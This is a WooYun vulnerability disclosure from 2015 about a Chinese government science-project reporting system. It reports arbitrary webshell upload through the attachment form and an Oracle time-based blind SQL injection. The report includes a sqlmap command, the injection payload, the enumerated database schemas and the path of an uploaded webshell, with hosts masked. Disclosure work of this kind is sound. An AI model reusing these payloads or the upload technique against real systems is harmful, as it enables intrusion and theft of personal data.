wybug_title: 某科技重大专项填报系统任意文件上传/sql注入泄露大量敏感信息
wybug_type: 文件上传导致任意代码执行
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-26：	细节已通知厂商并且等待厂商处理中									2015-12-30：	厂商已经确认，细节仅向厂商公开									2016-01-09：	细节向核心白帽子及相关领域专家公开									2016-01-19：	细节向普通白帽子公开									2016-01-29：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述： RT 详细说明：  该系统带有注册功能，在填写报表之后可上传附件，附件改为webshell可直接获得权限，添加信息参数链接存在sql注入漏洞。网站地址：http://**.**.**.**/

点击注册：

在成功填写单位信息-联系信息-水环境研究及管理能力的证明，之后来到附件上传，

把附件改为自己的webshell就上传成功了。注入点：http://**.**.**.**/attachment/AddDocsEntirdomainlogin.jsp?owner=1&ownerLevel=1&catalogID=110&showFlag=0&ownerID=31083@kali:~# sqlmap -u "http://**.**.**.**/attachment/AddDocsEntirdomainlogin.jsp?owner=1&ownerLevel=1&catalogID=110&showFlag=0&ownerID=31083" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151225}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:54:54[17:54:54] [INFO] resuming back-end DBMS 'oracle' [17:54:54] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: owner (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: owner=1' AND 6187=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(76)||CHR(68)||CHR(82),5) AND 'RVkT'='RVkT&ownerLevel=1&catalogID=110&showFlag=0&ownerID=31083---[17:54:55] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[17:54:55] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[17:54:55] [INFO] fetching database (schema) names[17:54:55] [INFO] fetching number of databases[17:54:55] [WARNING] time-based comparison requires larger statistical model, please wait..............................[17:55:00] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 2[17:58:11] [INFO] adjusting time delay to 2 seconds due to good response times1[17:58:14] [INFO] retrieved: CTXSYS[17:59:21] [INFO] retrieved: DBSNMP[18:00:29] [INFO] retrieved: DMSYS[18:01:23] [INFO] retrieved: EXFSYS[18:02:29] [INFO] retrieved: HR[18:02:54] [INFO] retrieved: IX[18:03:20] [INFO] retrieved: MDSYSA[18:04:18] [INFO] retrieved: OE[18:04:41] [INFO] retrieved: OLAPSYS[18:05:58] [INFO] retrieved: ONREP[18:06:58] [INFO] retrieved: ORDSYS[18:08:04] [INFO] retrieved: OUTLN[18:09:07] [INFO] retrieved: PM[18:09:34] [INFO] retrieved: SCOTT[18:10:32] [INFO] retrieved: SH[18:10:58] [INFO] retrieved: SYS[18:11:32] [INFO] retrieved: SYSMAN[18:12:34] [INFO] retrieved: SYSTEM[18:13:38] [INFO] retrieved: TSMSYS[18:14:44] [INFO] retrieved: WMSYS[18:15:40] [INFO] retrieved: XDBavailable databases [21]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HR[*] IX[*] MDSYSA[*] OE[*] OLAPSYS[*] ONREP[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB   漏洞证明：  webshell证明：http://**.**.**.**//FileUpload/1/one.jsp各类人员资料和填表信息

数据库信息：

   修复方案：  对上传内容和提交参数做过滤。   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-30 16:25 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向国家上级信息安全协调机构上报,由其后续协调网站管理单位处置  最新状态： 暂无
